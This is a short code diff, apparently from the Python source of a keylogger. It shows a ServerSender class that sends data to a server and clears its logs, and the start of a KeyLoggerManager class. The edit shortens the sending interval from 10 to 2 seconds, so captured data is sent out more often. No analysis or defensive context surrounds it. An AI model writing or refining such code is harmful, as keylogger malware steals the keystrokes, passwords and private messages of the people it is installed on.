@@ -69,7 +69,7 @@ class ServerSender:
                     self.service.clear_logs()
                 except requests.exceptions.RequestException as e:
                     print(f"Error sending data: {e}")
-            time.sleep(10)
+            time.sleep(2)
 
 class KeyLoggerManager:
     def __init__(self):
